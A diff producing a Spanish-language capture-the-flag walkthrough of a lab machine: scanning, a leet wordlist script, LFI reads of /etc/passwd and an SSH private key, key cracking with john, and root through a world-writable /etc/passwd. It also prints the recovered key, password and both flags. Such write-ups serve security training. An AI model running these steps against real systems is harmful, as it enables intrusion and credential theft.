@@ -1,5 +1,20 @@
+# Write-Up:  p4l4nc4
+
+## Tabla de Contenido
+1. [Escaneo Nmap](#nmap-scan)
+2. [Enumeración de Directorios con Dirsearch](#busqueda-de-directorios)
+3. [Creación de un Diccionario Personalizado](#creación-de-un-diccionario-personalizado)
+4. [Explotación de LFI (Local File Inclusion)](#explotación-de-lfi-local-file-inclusion)
+5. [Crackeo de la Clave Privada SSH](#crackeo-de-la-clave-privada-ssh)
+6. [Acceso al Sistema mediante SSH](#acceso-al-sistema-mediante-ssh)
+7. [Escalada de Privilegios](#escalada-de-privilegios)
+
+---
+
+
 ## Nmap Scan
-```
+<!--Esta en java para que se vea bonito-->
+```java
 # Nmap 7.94SVN scan initiated Tue Apr  1 19:01:24 2025 as: nmap -sCV -p22,80 -oN target 192.168.21.6
 Nmap scan report for 192.168.21.6
 Host is up (0.00028s latency).
@@ -18,10 +33,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Apr  1 19:01:30 2025 -- 1 IP address (1 host up) scanned in 6.50 seconds
 ```
+---
+
+## Busqueda de directorios
+
 ```bash
 dirsearch -u http://192.168.21.6/
 ```
-```
+**Resultados**
+```rust
 # Dirsearch started Tue Apr  1 19:03:36 2025 as: /usr/bin/dirsearch -u http://192.168.21.6
 
 403   277B   http://192.168.21.6/.ht_wsr.txt
@@ -45,29 +65,30 @@ dirsearch -u http://192.168.21.6/
 403   277B   http://192.168.21.6/server-status/
 403   277B   http://192.168.21.6/server-status
 ```
+Descargamos `robots.txt`
+```bash
+curl http://192.168.21.6/robots.txt
+```
+---
 
-`http://192.168.21.6/robots.txt`
+## Creación de un Diccionario Personalizado
 
 ```bash
-cewl http://192.168.21.6/robots.txt
+cewl http://192.168.21.6/robots.txt > robots.txt
 ```
 
-leet 1337 converter
-
+Creamos un diccionario Leet 1337 para el archivo robots.txt con el siguiente script
 ```bash
 #!/bin/bash
 
-# Verify that a file was provided as an argument.
 if [ "$#" -ne 1 ]; then
     echo "Usage: $0 dic.txt"
     exit 1
 fi
 
-# Input/output files
 file_input="$1"
 file_output="1337_format.txt"
 
-# Transformations in basic 1337 format using sed tool
 sed -e 's/a/4/g' \
     -e 's/e/3/g' \
     -e 's/i/1/g' \
@@ -77,16 +98,16 @@ sed -e 's/a/4/g' \
     -e 's/t/7/g' \
     "$file_input" > temp_1337.txt
 
-# Merge original and transformed words, removing duplicates and unnecessary capital letters
 cat "$file_input" temp_1337.txt | tr '[:upper:]' '[:lower:]' | sort | uniq > "$file_output"
 
-# Clean temp file
 rm temp_1337.txt
 
-# Show success message
 echo "saved to : $file_output"
 ```
-`dirsearch -u http://192.168.21.6/ --wordlists=1337_format.txt`
+Utilizamos el diccionario generado para buscar directorios adicionales:
+```bash
+dirsearch -u http://192.168.21.6/ --wordlists=1337_format.txt
+```
 
 ```
 # Dirsearch started Wed Apr  2 16:44:45 2025 as: /usr/bin/dirsearch -u http://192.168.21.6/ --wordlists=1337_format.txt
@@ -98,9 +119,19 @@ echo "saved to : $file_output"
 
 301   312B   http://192.168.21.6/n3gr4/m414nj3.php    -> REDIRECTS TO: http://192.168.21.6/n3gr4/m414nj3.php
 ```
-`wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://192.168.21.6/n3gr4/m414nj3.php?FUZZ=/etc/passwd --hh=0`
+---
 
+## Explotación de LFI (Local File Inclusion)
+
+Hay una vulnerabilidad de inclusión de archivos locales (LFI) en el archivo `m414nj3.php`.
+
+```bash
+wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://192.168.21.6/n3gr4/m414nj3.php?FUZZ=/etc/passwd --hh=0
 ```
+
+Accedemos al archivo `/etc/passwd`:
+
+```java
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -119,8 +150,10 @@ Processed Requests: 951
 Filtered Requests: 950
 Requests/sec.: 0
 ```
-
-`curl http://192.168.21.6/n3gr4/m414nj3.php?page=/etc/passwd`
+Vemos el contenido de `/etc/passwd` y vemos que esta el usuario `p4l4nc4`:
+```bash
+curl http://192.168.21.6/n3gr4/m414nj3.php?page=/etc/passwd
+```
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -146,8 +179,10 @@ sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
 p4l4nc4:x:1000:1000:p4l4nc4,,,:/home/p4l4nc4:/bin/bash
 ```
 
-`curl http://192.168.21.6/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa`
-
+Encontramos que estan las claves privadas de `p4l4nc4`:
+```bash
+curl http://192.168.21.6/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa
+```
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCvTRnNli
@@ -178,9 +213,18 @@ OJEM2NZSUU52PExgYtSXwO5aDy70oKiu0pbifoYOm19hlYwYWOOa6s+oW2FG+aXO8WIeEa
 muaZDiXw==
 -----END OPENSSH PRIVATE KEY-----
 ```
-`ssh2john id_rsa > passwd`
-`john passwd --wordlist=/usr/share/wordlists/rockyou.txt`
+----
+
+## Crackeo de la Clave Privada SSH
+Utilizamos `ssh2john` para convertir la clave privada en un formato compatible con `john` y luego se crackeó con el diccionario `rockyou.txt`:
+```bash
+ssh2john id_rsa > passwd
 ```
+```bash
+john passwd --wordlist=/usr/share/wordlists/rockyou.txt`
+```
+Encontramos la contraseña:
+```java
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
@@ -192,15 +236,25 @@ friendster       (id_rsa)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-`ssh p4l4nc4@192.168.21.6`
-user flag
-`HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}`
+----
+## Acceso al Sistema mediante SSH
+Entramos por ssh con la contraseña `friendster`
+```bash
+ssh p4l4nc4@192.168.21.6
+```
+User flag: `HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}`
 
+## Escalada de privilegios
+
+Encontramos que el archivo `/etc/passwd` tiene permisos de escritura para todos por lo que quitamos la contraseña a root:
 ```
 -rw-rw-rw-  1 root root    1066 Nov 13 12:28 passwd
 ```
-root flag
+Ahora con `su -` somos root
+Root flag
 ```
 HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}
 ```
+---
 
+**Autor: Xavier Quintero Carrejo**
